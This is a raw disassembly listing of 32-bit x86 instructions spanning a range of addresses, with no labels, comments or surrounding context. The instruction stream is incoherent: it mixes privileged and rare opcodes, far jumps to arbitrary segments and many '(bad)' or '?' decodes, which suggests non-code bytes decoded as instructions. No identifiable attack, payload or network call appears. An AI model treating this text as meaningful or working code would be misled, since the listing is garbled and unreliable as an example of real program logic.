  41cc58:	mov    BYTE PTR [edx+0x23],bl
  41cc5b:	aaa    
  41cc5c:	pop    ss
  41cc5d:	mov    ds:0x1778c80a,eax
  41cc62:	sbb    eax,0x352a1c2d
  41cc67:	arpl   bp,sp
  41cc69:	fidiv  WORD PTR [edx]
  41cc6b:	xor    esi,DWORD PTR [ebx+0x7f751cf]
  41cc71:	lahf   
  41cc72:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cc73:	add    eax,0xeadebefe
  41cc78:	ds pusha 
  41cc7a:	test   ch,0x62
  41cc7d:	or     BYTE PTR [edi],0xab
  41cc80:	lock sbb eax,0x36141add
  41cc86:	xor    cl,BYTE PTR [ebx+0x1c8a70b6]
  41cc8c:	and    cl,ch
  41cc8e:	jg     0x41cc52
  41cc90:	dec    ebx
  41cc91:	jmp    0x8475:0x6f2a5a2e
  41cc98:	dec    edi
  41cc99:	push   edx
  41cc9a:	mov    dl,ch
  41cc9c:	fsubr  QWORD PTR [eax+edx*2]
  41cc9f:	cmp    esp,ebx
  41cca1:	daa    
  41cca2:	xchg   BYTE PTR [ebx-0x33547b81],al
  41cca8:	xchg   ebx,eax
  41cca9:	pop    ebx
  41ccaa:	pop    ss
  41ccab:	xor    BYTE PTR [edx],dl
  41ccad:	mov    ch,0xfa
  41ccaf:	hlt    
  41ccb0:	out    dx,eax
  41ccb1:	jmp    0xffae1ae2
  41ccb6:	rcr    DWORD PTR [esi],0xb7
  41ccb9:	inc    esi
  41ccba:	mov    eax,ds:0x31ca8a31
  41ccbf:	add    al,0xfc
  41ccc1:	push   0x5d2c9dd3
  41ccc6:	fcomip st,st(0)
  41ccc8:	lods   eax,DWORD PTR ds:[esi]
  41ccc9:	inc    edi
  41ccca:	mov    ecx,0xc01b52ad
  41cccf:	out    0xb9,al
  41ccd1:	cmp    DWORD PTR [ecx+0x26cc4c4f],esp
  41ccd7:	aas    
  41ccd8:	inc    edx
  41ccd9:	gs cs pop esi
  41ccdc:	(bad)  
  41ccdd:	push   edx
  41ccde:	dec    esp
  41ccdf:	sub    eax,DWORD PTR [ebx+0x580691f7]
  41cce5:	xor    al,0xae
  41cce7:	push   cs
  41cce8:	push   edx
  41cce9:	popa   
  41ccea:	bound  ebp,QWORD PTR [eax-0x2c]
  41cced:	pop    eax
  41ccee:	pop    ebp
  41ccef:	inc    ebp
  41ccf0:	inc    esi
  41ccf1:	sbb    al,0x87
  41ccf3:	ss lahf 
  41ccf5:	cmp    BYTE PTR [esi],dh
  41ccf7:	xchg   BYTE PTR [edi-0x3],al
  41ccfa:	pop    es
  41ccfb:	jmp    0xc33b:0xf14f1f7a
  41cd02:	sbb    eax,0xfae24efd
  41cd07:	xor    ebx,DWORD PTR [esi]
  41cd09:	daa    
  41cd0a:	jp     0x41cd70
  41cd0c:	popa   
  41cd0d:	inc    esi
  41cd0e:	inc    ebx
  41cd0f:	xor    eax,0x506498b0
  41cd14:	inc    eax
  41cd15:	mov    al,ds:0x6b848eaa
  41cd1a:	dec    ebp
  41cd1b:	push   esi
  41cd1c:	rcl    BYTE PTR [edx],1
  41cd1e:	icebp  
  41cd1f:	int3   
  41cd20:	and    BYTE PTR [eax+edx*1+0x7c],cl
  41cd24:	and    dh,al
  41cd26:	push   edi
  41cd27:	add    ebx,DWORD PTR [esi-0x20]
  41cd2a:	lods   al,BYTE PTR ds:[esi]
  41cd2b:	sub    eax,0xdb2261dd
  41cd30:	out    dx,al
  41cd31:	mov    edx,0xc22921f4
  41cd36:	loope  0x41ccc8
  41cd38:	mov    ds:0x360b1f34,al
  41cd3d:	in     eax,dx
  41cd3e:	and    edx,DWORD PTR [edx-0x4d]
  41cd41:	(bad)  
  41cd42:	iret   
  41cd43:	xchg   ebx,eax
  41cd44:	add    ah,BYTE PTR [esi-0x1d7ef23b]
  41cd4a:	mov    edx,DWORD PTR [ecx-0x6f]
  41cd4d:	repz add DWORD PTR ds:0x9d70d6b6,esi
  41cd54:	leave  
  41cd55:	dec    edi
  41cd56:	dec    dx
  41cd58:	ss cmc 
  41cd5a:	pinsrw mm7,esp,0x6d
  41cd5e:	int    0x2d
  41cd60:	pop    ecx
  41cd61:	jg     0x41cd31
  41cd63:	out    dx,eax
  41cd64:	ret    0xbef
  41cd67:	ins    BYTE PTR es:[edi],dx
  41cd68:	inc    edi
  41cd69:	icebp  
  41cd6a:	lds    esp,FWORD PTR ds:0x3edb4f52
  41cd70:	in     al,0x48
  41cd72:	out    0xb1,al
  41cd74:	pop    esi
  41cd75:	(bad)  
  41cd76:	and    al,0x2d
  41cd78:	std    
  41cd79:	xchg   DWORD PTR [edi],edx
  41cd7b:	and    eax,0xa1fc5f06
  41cd80:	repz scas eax,DWORD PTR es:[edi]
  41cd82:	push   ds
  41cd83:	das    
  41cd84:	and    bl,BYTE PTR [edx+ecx*4+0x49288731]
  41cd8b:	sub    al,dh
  41cd8d:	ret    
  41cd8e:	sbb    edx,DWORD PTR [edi]
  41cd90:	jl     0x41cde6
  41cd92:	push   ds
  41cd93:	inc    edi
  41cd94:	leave  
  41cd95:	sbb    cl,BYTE PTR [esi-0x5d]
  41cd98:	jnp    0x41cd2a
  41cd9a:	sbb    eax,0xf749f323
  41cd9f:	mov    DWORD PTR [esi+0x45],ecx
  41cda2:	call   0x87d3:0x5a8b355a
  41cda9:	adc    eax,0xa594b29a
  41cdae:	test   BYTE PTR [esi-0x2f],ch
  41cdb1:	pop    esp
  41cdb2:	mov    dl,0x2e
  41cdb4:	cld    
  41cdb5:	rcl    BYTE PTR [esi-0x11],1
  41cdb8:	mov    dh,dl
  41cdba:	xchg   ebx,eax
  41cdbb:	mov    bl,0x1f
  41cdbd:	and    eax,0x75598d26
  41cdc2:	inc    edx
  41cdc3:	stos   DWORD PTR es:[edi],eax
  41cdc4:	scas   eax,DWORD PTR es:[edi]
  41cdc5:	mov    BYTE PTR [edx],dl
  41cdc7:	nop
  41cdc8:	mov    ?,WORD PTR [edi]
  41cdca:	xchg   esi,eax
  41cdcb:	bnd lock jmp 0xfe7434ff
  41cdd2:	dec    ebp
  41cdd3:	lds    edi,FWORD PTR [esi-0x467cd420]
  41cdd9:	sub    esp,DWORD PTR [esi]
  41cddb:	mov    ds:0x1a7559e9,al
  41cde0:	retf   
  41cde1:	mov    BYTE PTR [edx+0x13d3a172],ch
  41cde7:	ret    
  41cde8:	adc    ch,bl
  41cdea:	iret   
  41cdeb:	mov    eax,0xada3bac6
  41cdf0:	xchg   esi,eax
  41cdf1:	inc    esp
  41cdf2:	test   eax,0xe1ded3fb
  41cdf7:	out    0xcb,al
  41cdf9:	or     esi,ebp
  41cdfb:	imul   esi,DWORD PTR [ebx],0x10bf5025
  41ce01:	sbb    esi,DWORD PTR [edx+0x22]
  41ce04:	xchg   DWORD PTR [ebx+edi*4+0x37417892],eax
  41ce0b:	dec    ecx
  41ce0c:	pushf  
  41ce0d:	mov    ch,0xa4
  41ce0f:	jp     0x41cda5
  41ce11:	push   ss
  41ce12:	mov    dl,0x90
  41ce14:	xchg   edx,eax
  41ce15:	jb     0x41cdb4
  41ce17:	pop    esp
  41ce18:	loope  0x41ce20
  41ce1a:	lahf   
  41ce1b:	lahf   
  41ce1c:	(bad)  
  41ce1d:	call   0x32b95c53
  41ce22:	add    eax,0x4cf73af
  41ce27:	fild   WORD PTR [edi]
  41ce29:	pushf  
  41ce2a:	mov    bh,0xb6
  41ce2c:	push   0x76
  41ce2e:	pop    ebx
  41ce2f:	mov    cs,WORD PTR [esp+edi*8+0x379f09f9]
  41ce36:	mov    bh,0xf9
  41ce38:	cdq    
  41ce39:	mov    ds,WORD PTR [edx+ecx*2-0x4f]
  41ce3d:	push   ebp
  41ce3e:	ret    
  41ce3f:	stos   BYTE PTR es:[edi],al
  41ce40:	xchg   ebx,eax
  41ce41:	aas    
  41ce42:	rcr    BYTE PTR [edx-0x6a86c14e],0x93
  41ce49:	call   0xf4a:0x29f9745d
  41ce50:	dec    edx
  41ce51:	xchg   ebx,eax
  41ce52:	jg     0x41cebe
  41ce54:	xor    bh,BYTE PTR [esi]
  41ce56:	push   ds
  41ce57:	imul   ecx,DWORD PTR ds:0x1dd2aee,0x905a262a
  41ce61:	(bad)  [edx+0x2da3892]
  41ce67:	inc    edi
  41ce68:	repz sar DWORD PTR [esi+edi*2],1
  41ce6c:	sbb    edx,DWORD PTR [edx-0x24]
  41ce6f:	sub    dh,BYTE PTR [ecx+ebx*4-0x70ee88ef]
  41ce76:	sub    ebx,esp
  41ce78:	dec    esp
  41ce79:	(bad)  
  41ce7a:	mov    edx,0x683b8340
  41ce7f:	xor    eax,0x15315e18
  41ce84:	(bad)  
  41ce85:	addr16 and al,0x3d
  41ce88:	arpl   WORD PTR [ebx],sp
  41ce8a:	retf   
  41ce8b:	xor    al,0x2b
  41ce8d:	cmp    ebp,DWORD PTR [ebx-0x64]
  41ce90:	jmp    0x9a753d49
  41ce95:	sbb    al,0xb6
  41ce97:	cmp    ch,BYTE PTR [edx]
  41ce99:	ficomp WORD PTR [ebx+0x77905587]
  41ce9f:	jg     0x41ce48
  41cea1:	imul   eax,edx,0xffffffa1
  41cea4:	jbe    0x41ce55
  41cea6:	pop    ecx
  41cea7:	scas   eax,DWORD PTR es:[edi]
  41cea8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cea9:	xchg   esi,eax
  41ceaa:	lahf   
  41ceab:	mov    eax,0xe6a72863
  41ceb0:	out    0xac,al
  41ceb2:	sbb    DWORD PTR [edx],ebx
  41ceb4:	clc    
  41ceb5:	xchg   ebx,eax
  41ceb6:	sub    eax,0x6d930b4b
  41cebb:	xchg   esi,eax
  41cebc:	jmp    0x24c6:0xc2aaacab
  41cec3:	ss xchg ecx,eax
  41cec5:	ja     0x41ced8
  41cec7:	addr16 pop edx
  41cec9:	and    BYTE PTR [eax+0x17a6fb08],bh
  41cecf:	mov    esp,0xf0ae2fe0
  41ced4:	imul   bl
  41ced6:	popf   
  41ced7:	ja     0x41cedb
  41ced9:	jecxz  0x41cedc
  41cedb:	jae    0x41ce67
  41cedd:	inc    ebx
  41cede:	into   
  41cedf:	stos   BYTE PTR es:[edi],al
  41cee0:	call   0x4c9bc53c
  41cee5:	xchg   edx,eax
  41cee6:	mov    ds:0x98307159,al
  41ceeb:	jle    0x41ce95
  41ceed:	imul   ebx,DWORD PTR [eax+esi*8],0x722a866c
  41cef4:	push   ebx
  41cef5:	xchg   ebp,eax
  41cef6:	pop    edi
  41cef7:	cmp    DWORD PTR [ebx+ecx*1+0x14],eax
  41cefb:	mov    WORD PTR [esi+0x1eb5282f],cs
  41cf01:	loopne 0x41cecb
  41cf03:	ds icebp 
  41cf05:	xchg   esi,eax
  41cf06:	or     BYTE PTR [ebp-0x7779098f],dl
  41cf0c:	mov    bl,0x8
  41cf0e:	imul   eax,DWORD PTR [edx-0x3f],0xffffff9b
  41cf12:	les    edx,FWORD PTR [eax]
  41cf14:	mov    ecx,0x413a9549
  41cf19:	mov    edx,ebx
  41cf1b:	call   0x3ed51bd2
  41cf20:	dec    esp
  41cf21:	mov    ds:0xbb133591,al
  41cf26:	pop    esp
  41cf27:	(bad)  
  41cf29:	push   eax
  41cf2a:	in     eax,dx
  41cf2b:	jno    0x41ceca
  41cf2d:	jno    0x41cefb
  41cf2f:	jecxz  0x41cfac
  41cf31:	stos   DWORD PTR es:[edi],eax
  41cf32:	jne    0x41cf58
  41cf34:	icebp  
  41cf35:	ror    BYTE PTR [ecx],cl
  41cf37:	in     eax,dx
  41cf38:	jmp    0xd5c2:0x8d1c606d
  41cf3f:	cdq    
  41cf40:	loope  0x41cfbe
  41cf42:	mul    BYTE PTR [esi+0x3c636c3b]
  41cf48:	mov    edi,0xc6cdae0a
  41cf4d:	sub    DWORD PTR [ebx],edx
  41cf4f:	jp     0x41ced4
  41cf51:	fild   QWORD PTR [esi+0x7ee4b34f]
  41cf57:	inc    edi
  41cf58:	loopne 0x41cf81
  41cf5a:	push   ecx
  41cf5b:	fst    QWORD PTR [ecx]
  41cf5d:	out    dx,al
  41cf5e:	mov    ch,BYTE PTR [edi]
  41cf60:	arpl   WORD PTR [edi+0x43],sp
  41cf63:	xchg   ecx,eax
  41cf64:	adc    eax,0x3ae47330
  41cf69:	sub    BYTE PTR [ecx-0x4a525b56],dl
  41cf6f:	push   edi
  41cf70:	add    esp,ecx
  41cf72:	(bad)  
  41cf73:	retf   0x4a4e
  41cf76:	jne    0x41cfbf
  41cf78:	xchg   edx,eax
  41cf79:	outs   dx,DWORD PTR ds:[esi]
  41cf7a:	inc    edx
  41cf7b:	in     al,0xac
  41cf7d:	xor    BYTE PTR [eax+0x2e],bh
  41cf80:	fimul  WORD PTR [esi+0x7c]
  41cf83:	into   
  41cf84:	sbb    ebx,DWORD PTR [ecx-0x52]
  41cf87:	sbb    eax,0x37bf074f
  41cf8c:	cmp    edx,edx
  41cf8e:	push   ecx
  41cf8f:	loope  0x41cfd1
  41cf91:	inc    edx
  41cf92:	cmp    ebp,DWORD PTR [ebx+0x271dd848]
  41cf98:	mov    al,ds:0xd0aa93c1
  41cf9d:	aad    0x60
  41cf9f:	fwait
  41cfa0:	in     eax,0x42
  41cfa2:	jae    0x41cf53
  41cfa4:	hlt    
  41cfa5:	mov    dl,0xa
  41cfa7:	ret    
  41cfa8:	int3   
  41cfa9:	aam    0x30
  41cfab:	push   0x5ea04b3c
  41cfb0:	mov    al,0x99
  41cfb2:	add    BYTE PTR [edi],al
  41cfb4:	cmp    al,0xc1
  41cfb6:	int    0x64
  41cfb8:	mov    DWORD PTR [edx-0x481744f9],edx
  41cfbe:	je     0x41cf7c
  41cfc0:	scas   al,BYTE PTR es:[edi]
  41cfc1:	das    
  41cfc2:	aaa    
  41cfc3:	xor    al,0x27
  41cfc5:	fwait
  41cfc6:	mov    al,dh
  41cfc8:	xor    DWORD PTR [bx+si+0x20],edi
  41cfcc:	lods   eax,DWORD PTR ds:[esi]
  41cfcd:	jmp    0xf0ee:0x85db6713
  41cfd4:	and    eax,0x8e6f2ac4
  41cfd9:	test   dl,0x78
  41cfdc:	rcl    DWORD PTR ds:0x3eca03d3,1
  41cfe2:	mov    dh,0x47
  41cfe4:	mov    bh,0x4c
  41cfe6:	lods   al,BYTE PTR ds:[esi]
  41cfe7:	das    
  41cfe8:	pop    ebp
  41cfe9:	jp     0x41cf6f
  41cfeb:	add    BYTE PTR [ecx-0x75],ah
  41cfee:	sub    eax,0x4ce23d9d
  41cff3:	pop    esi
  41cff4:	add    ebp,DWORD PTR ds:0xfa
  41cffa:	add    BYTE PTR [eax],al
  41cffc:	add    BYTE PTR [eax],al
  41cffe:	add    BYTE PTR [eax],al
  41d000:	add    BYTE PTR [edx-0x217875bc],dl
  41d006:	iret   
  41d007:	lahf   
  41d008:	push   ebp
  41d009:	loop   0x41cf9a
  41d00b:	aad    0x3
  41d00d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d00e:	sbb    DWORD PTR [eax],0x14c3b92
  41d014:	add    BYTE PTR [esi-0x1afffffd],ch
  41d01a:	mov    ch,0xb8
  41d01c:	xor    BYTE PTR [edi],dl
  41d01e:	ins    DWORD PTR es:[edi],dx
  41d01f:	mov    eax,0x5791e86d
  41d024:	jb     0x41d007
  41d026:	inc    eax
  41d027:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d028:	inc    ebp
  41d029:	inc    edx
  41d02a:	sub    al,0xe
  41d02c:	mov    al,0xe9
  41d02e:	stos   DWORD PTR es:[edi],eax
  41d02f:	inc    eax
  41d030:	jns    0x41d06f
  41d032:	in     al,0x4c
  41d034:	fldenv [esi+0x52]
  41d037:	xor    BYTE PTR [ebx-0x113cf133],dh
  41d03d:	mul    DWORD PTR [ebx+ebx*2]
  41d040:	(bad)
  41d044:	hlt    
  41d045:	sub    eax,0x8c379355
  41d04a:	mov    ecx,0x4e2568a6
  41d04f:	inc    edx
  41d050:	stos   DWORD PTR es:[edi],eax
  41d051:	cdq    
  41d052:	mov    dh,0x2a
  41d054:	jne    0x41d087
  41d056:	mov    dl,0x6b
  41d058:	(bad)  
  41d059:	xchg   esi,eax
  41d05a:	jo     0x41d019
  41d05c:	fst    QWORD PTR [edi+0x249b87ab]
  41d062:	sbb    al,BYTE PTR [ebp-0x6204671]
  41d068:	repz xor DWORD PTR [edi],ebp
  41d06b:	pusha  
  41d06c:	pop    es
  41d06d:	mov    ah,0xa7
  41d06f:	jl     0x41d039
  41d071:	dec    ecx
  41d072:	stc    
  41d073:	mov    eax,0x638b031e
  41d078:	retf   0x216a
  41d07b:	xchg   edi,eax
  41d07c:	jne    0x41d096
  41d07e:	or     eax,0xdf2ed6b0
  41d083:	sub    eax,DWORD PTR [esi+0x46]
  41d086:	pop    ebp
  41d087:	jnp    0x41d0ba
  41d089:	shl    BYTE PTR [eax-0x1],0xc8
  41d08d:	fcos   
  41d08f:	pop    ebp
  41d090:	pop    edx
  41d091:	mov    ah,0x1c
  41d093:	test   al,0x48
  41d095:	sahf   
  41d096:	out    0x4e,al
  41d098:	mov    dl,0x54
  41d09a:	dec    esp
  41d09b:	ret    0x292
  41d09e:	mov    eax,ds:0x3a30dd2d
  41d0a3:	ror    DWORD PTR es:[ebx-0x1fd6d336],cl
  41d0aa:	test   BYTE PTR [eax],0xdc
  41d0ad:	xor    BYTE PTR [ecx+0x685893aa],bl
  41d0b3:	mov    al,ds:0xd1a07d07
  41d0b8:	adc    DWORD PTR [edi+ebp*8+0x8],edx
  41d0bc:	ds iret 
  41d0be:	push   edx
  41d0bf:	xchg   esi,eax
  41d0c0:	scas   al,BYTE PTR es:[edi]
  41d0c1:	jmp    0x41e124e8
  41d0c6:	int3   
  41d0c7:	sbb    al,0xa5
  41d0c9:	arpl   WORD PTR [ecx],di
  41d0cb:	pop    es
  41d0cc:	sti    
  41d0cd:	out    0x6d,eax
  41d0cf:	enter  0xa553,0xa1
  41d0d3:	jl     0x41d073
  41d0d5:	mov    al,0x11
  41d0d7:	mov    eax,0x93edd501
  41d0dc:	push   ecx
  41d0dd:	dec    ebx
  41d0de:	mov    dl,0x8e
  41d0e0:	push   ecx
  41d0e1:	adc    DWORD PTR [esi-0x41e5d4f5],eax
  41d0e7:	cs push ebx
  41d0e9:	push   esp
  41d0ea:	fidiv  DWORD PTR [esi+0x2eea923b]
  41d0f0:	ja     0x41d0bd
  41d0f2:	das    
  41d0f3:	cmp    DWORD PTR [ebp-0x2d738385],ebp
  41d0f9:	cmp    al,0xad
  41d0fb:	pop    ecx
  41d0fc:	enter  0xe99e,0xb3
  41d100:	adc    al,ah
  41d102:	fidiv  WORD PTR [edx]
  41d104:	jnp    0x41d0e6
  41d106:	outs   dx,BYTE PTR ds:[esi]
  41d107:	mov    al,0x21
  41d109:	(bad)  
  41d10a:	fmul   DWORD PTR [ebx+0x62cbf7f3]
  41d110:	cld    
  41d111:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d112:	jb     0x41d0d8
  41d114:	cs enter 0xe36e,0x9f
  41d119:	fwait
  41d11a:	(bad)  
  41d11b:	pop    edx
  41d11c:	into   
  41d11d:	js     0x41d139
  41d11f:	(bad)  
  41d121:	push   eax
  41d122:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d123:	hlt    
  41d124:	push   esp
  41d125:	test   BYTE PTR [edi],ch
  41d127:	dec    edi
  41d128:	xchg   ecx,eax
  41d129:	sbb    eax,0xffd763dc
  41d12e:	pop    edi
  41d12f:	int    0xa6
  41d131:	xchg   edx,eax
  41d132:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d133:	nop
  41d134:	inc    ebx
  41d135:	cmp    eax,DWORD PTR [eax+0xec51286]
  41d13b:	rcl    ebx,0x5d
  41d13e:	jp     0x41d0ed
  41d140:	xchg   ebp,eax
  41d141:	adc    edx,DWORD PTR [esi]
  41d143:	(bad)  
  41d144:	or     al,0x7a
  41d146:	sbb    esp,DWORD PTR [esi]
  41d148:	mov    dh,0x7b
  41d14a:	sbb    al,0x14
  41d14c:	js     0x41d104
  41d14e:	shr    BYTE PTR fs:[eax],cl
  41d151:	in     eax,0x39
  41d153:	repnz xor al,0xfc
  41d156:	sub    al,0x6a
  41d158:	pop    ecx
  41d159:	cdq    
  41d15a:	fldcw  WORD PTR [eax]
  41d15c:	and    ch,BYTE PTR [ecx]
  41d15e:	cmp    DWORD PTR [ebp-0x1e],0xffffffb6
  41d162:	clc    
  41d163:	jbe    0x41d133
  41d165:	pop    eax
  41d166:	pop    ebx
  41d167:	gs ja  0x41d1b8
  41d16a:	aad    0x4d
  41d16c:	adc    ecx,DWORD PTR ds:0x688db775
  41d172:	stos   DWORD PTR es:[di],eax
  41d174:	push   edx
  41d175:	bound  ecx,QWORD PTR [eax-0x1a67e407]
  41d17b:	xchg   ebp,eax
  41d17c:	daa    
  41d17d:	call   0x653826e5
  41d182:	repnz mov BYTE PTR [ebx+0x7ac90934],dh
  41d189:	mov    ebp,?
  41d18b:	inc    esi
  41d18c:	lds    eax,FWORD PTR [ecx-0xd2462ea]
  41d192:	mov    bh,0xe2
  41d194:	cmp    eax,0x8c86996c
  41d199:	arpl   WORD PTR [ecx],bx
  41d19b:	xchg   ebx,eax
  41d19c:	aas    
  41d19d:	ins    DWORD PTR es:[edi],dx
  41d19e:	or     eax,0xd039a225
  41d1a3:	call   0xa5cd:0xfc5a9201
  41d1aa:	pop    esi
  41d1ab:	rol    DWORD PTR [esi],1
  41d1ad:	ret    0xf99f
  41d1b0:	or     BYTE PTR [esp+esi*2-0x53c9282c],ah
  41d1b7:	sub    DWORD PTR [ebp-0x6190fa94],ecx
  41d1bd:	push   edx
  41d1be:	push   eax
  41d1bf:	mov    edi,0xbe5d89bb
  41d1c4:	xchg   ebx,eax
  41d1c5:	add    esi,edx
  41d1c7:	mov    ecx,0x9db9a5da
  41d1cc:	nop
  41d1cd:	push   0x39
  41d1cf:	sahf   
  41d1d0:	pop    edx
  41d1d1:	fsubr  QWORD PTR [eax+0x31cc740e]
  41d1d7:	mov    bh,0x12
  41d1d9:	mov    eax,0x449e6670
  41d1de:	sbb    ch,ch
  41d1e0:	stos   DWORD PTR es:[edi],eax
  41d1e1:	xchg   ebp,eax
  41d1e2:	stos   BYTE PTR es:[edi],al
  41d1e3:	jle    0x41d1bf
  41d1e5:	scas   al,BYTE PTR es:[edi]
  41d1e6:	jl     0x41d1e2
  41d1e8:	test   ecx,0xaf02e335
  41d1ee:	cmc    
  41d1ef:	sbb    al,0x2d
  41d1f1:	(bad)  
  41d1f2:	mov    edx,0x686995ba
  41d1f7:	clc    
  41d1f8:	sbb    esi,DWORD PTR [eax+0x6077a72b]
  41d1fe:	repz idiv dh
  41d201:	xor    eax,0xb693e57b
  41d206:	mov    edx,0x4271d54
  41d20b:	dec    eax
  41d20c:	jnp    0x41d22c
  41d20e:	push   ebp
  41d20f:	ins    DWORD PTR es:[edi],dx
  41d210:	push   esp
  41d211:	lods   eax,DWORD PTR ds:[esi]
  41d212:	xchg   ebp,eax
  41d213:	mov    al,0x16
  41d215:	fdiv   st,st(3)
  41d217:	sub    bl,BYTE PTR [edi+0x29]
  41d21a:	xchg   edx,eax
  41d21b:	and    ebx,edi
  41d21d:	push   esi
  41d21e:	add    BYTE PTR [eax+0x34],bh
  41d221:	ss push 0x9e8df72c
  41d227:	aaa    
  41d228:	adc    edi,DWORD PTR [esi]
  41d22a:	leave  
  41d22b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d22c:	pushf  
  41d22d:	add    bl,ah
  41d22f:	inc    eax
  41d230:	(bad)  
  41d231:	loopne 0x41d284
  41d233:	xchg   esp,eax
  41d234:	aam    0x8b
  41d236:	mov    al,0x30
  41d238:	ins    DWORD PTR es:[edi],dx
  41d239:	out    dx,eax
  41d23a:	dec    ebx
  41d23b:	ds push eax
  41d23d:	outs   dx,BYTE PTR ds:[esi]
  41d23e:	pop    edx
  41d23f:	pop    ebp
  41d240:	jle    0x41d274
  41d242:	jg     0x41d278
  41d244:	and    al,0x3a
  41d246:	leave  
  41d247:	std    
  41d248:	dec    ebp
  41d249:	cli    
  41d24a:	push   ecx
  41d24b:	loopne 0x41d1ef
  41d24d:	mov    ebp,0x2673739f
  41d252:	sbb    ebp,0x9ad48489
  41d258:	or     DWORD PTR ds:0x7b312bbc,ebp
  41d25e:	stos   BYTE PTR es:[edi],al
  41d25f:	ins    BYTE PTR es:[edi],dx
  41d260:	xchg   esp,eax
  41d261:	and    eax,0xc1facd25
  41d266:	repz pop es
  41d268:	jp     0x41d245
  41d26a:	mov    al,ds:0xb9f6044b
  41d26f:	stc    
  41d270:	add    esi,DWORD PTR [edi-0x448c8372]
  41d276:	cli    
  41d277:	outs   dx,DWORD PTR ds:[esi]
  41d278:	mov    al,0x12
  41d27a:	loop   0x41d232
  41d27c:	imul   eax,ebp,0x4
  41d27f:	ret    
  41d280:	popa   
  41d281:	jnp    0x41d281
  41d283:	add    dh,dl
  41d285:	lea    edx,[edx+eiz*2-0x454cea5b]
  41d28c:	and    edx,ebp
  41d28e:	jb     0x41d2f6
  41d290:	mov    edx,0xa7446893
  41d295:	lea    edx,[ecx-0x1445e4ad]
  41d29b:	mov    eax,ds:0x2166c3b8
  41d2a0:	adc    al,bh
  41d2a2:	dec    edx
  41d2a3:	out    0xdb,eax
  41d2a5:	out    0x74,al
  41d2a7:	out    dx,al
  41d2a8:	push   edi
  41d2a9:	push   ebx
  41d2aa:	or     BYTE PTR [ebp+0x19ece1b3],dl
  41d2b0:	loope  0x41d23c
  41d2b2:	wrmsr  
  41d2b4:	mov    edx,0x6224bf4e
  41d2b9:	push   es
  41d2ba:	push   edx
  41d2bb:	or     BYTE PTR [ecx+edi*1+0x3d],bl
  41d2bf:	adc    al,0xe2
  41d2c1:	call   0xec23:0x5b8e2ba0
  41d2c8:	cld    
  41d2c9:	xor    DWORD PTR [esi-0x249347c2],edx
  41d2cf:	pop    edx
  41d2d0:	sub    al,0xca
  41d2d2:	out    0xe1,eax
  41d2d4:	out    dx,al
  41d2d5:	mov    ebp,esp
  41d2d7:	and    DWORD PTR [edx-0x348aad2d],0x95e3459c
  41d2e1:	and    BYTE PTR [edx],cl
  41d2e3:	or     ch,BYTE PTR [edx-0x2f]
  41d2e6:	fsubr  DWORD PTR [ecx+0x34]
  41d2e9:	cmp    bh,cl
  41d2eb:	inc    ecx
  41d2ec:	fistp  WORD PTR [edi]
  41d2ee:	arpl   bp,cx
  41d2f0:	cli    
  41d2f1:	add    esi,0x4c
  41d2f4:	inc    esi
  41d2f5:	inc    esi
  41d2f6:	mov    dh,0xe8
  41d2f8:	arpl   WORD PTR [edx-0x56081a4a],di
  41d2fe:	mov    eax,ds:0x9b896b22
  41d303:	leave  
  41d304:	jo     0x41d2f5
  41d306:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d308:	xchg   ebx,eax
  41d309:	add    eax,DWORD PTR [ebx-0x62]
  41d30c:	ret    0xfe0e
  41d30f:	mov    edi,0xb710c649
  41d314:	stos   DWORD PTR es:[edi],eax
  41d315:	ret    
  41d316:	iret   
  41d317:	fdivp  st(5),st
  41d319:	mov    ebx,0xa0eaa064
  41d31e:	xchg   ebp,eax
  41d31f:	or     BYTE PTR [ebx+0x6e],0x8
  41d323:	mov    al,0x73
  41d325:	adc    ah,BYTE PTR [edx-0x6e]
  41d328:	or     DWORD PTR [edi+0x14cd66fc],edi
  41d32e:	adc    esp,esp
  41d330:	pop    eax
  41d331:	cmp    ebp,0xfffffff6
  41d334:	inc    eax
  41d335:	jmp    0x41d375
  41d337:	(bad)  
  41d338:	fsin   
  41d33a:	mov    dl,0x69
  41d33c:	jecxz  0x41d335
  41d33e:	pop    ss
  41d33f:	dec    esi
  41d340:	push   esi
  41d341:	jg     0x41d36d
  41d343:	loopne 0x41d36a
  41d345:	xchg   DWORD PTR ds:0x634c40c2,edi
  41d34b:	jl     0x41d305
  41d34d:	dec    edi
  41d34e:	outs   dx,BYTE PTR ds:[esi]
  41d34f:	or     BYTE PTR [ebx],dh
  41d351:	mov    esi,0x508b74f3
  41d356:	push   esi
  41d357:	adc    esp,edi
  41d359:	retf   0x793e
  41d35c:	push   cs
  41d35d:	pop    eax
  41d35e:	lahf   
  41d35f:	ficom  DWORD PTR [ebp+0x8d92add]
  41d365:	ins    BYTE PTR es:[edi],dx
  41d366:	loop   0x41d3e6
  41d368:	shl    DWORD PTR [edx-0x31],cl
  41d36b:	xchg   ecx,eax
  41d36c:	stc    
  41d36d:	add    DWORD PTR [esi+esi*4+0x60],ebx
  41d371:	scas   eax,DWORD PTR es:[edi]
  41d372:	fiadd  WORD PTR [ebx-0x29a6146b]
  41d378:	mov    ebp,DWORD PTR ds:0x890081c8
  41d37e:	fcomp  QWORD PTR [ecx+0xf]
  41d381:	mov    eax,ds:0xea45d1
  41d386:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d387:	inc    esp
  41d388:	imul   edi,eax,0xffffffbe
  41d38b:	jo     0x41d37d
  41d38d:	(bad)  
  41d38e:	or     al,ah
  41d390:	sub    eax,0x5e443ef1
  41d395:	sbb    eax,0x3ed3b712
  41d39a:	cmp    eax,0x2dcf9493
  41d39f:	ins    DWORD PTR es:[edi],dx
  41d3a0:	outs   dx,DWORD PTR ds:[esi]
  41d3a1:	inc    ecx
  41d3a2:	dec    esi
  41d3a3:	xchg   esi,eax
  41d3a4:	addr16 inc esp
  41d3a6:	xchg   ebx,eax
  41d3a7:	loop   0x41d417
  41d3a9:	aad    0x4d
  41d3ab:	ret    
  41d3ac:	bt     DWORD PTR [esi],ebp
  41d3af:	jnp    0x41d356
  41d3b1:	iret   
  41d3b2:	popf   
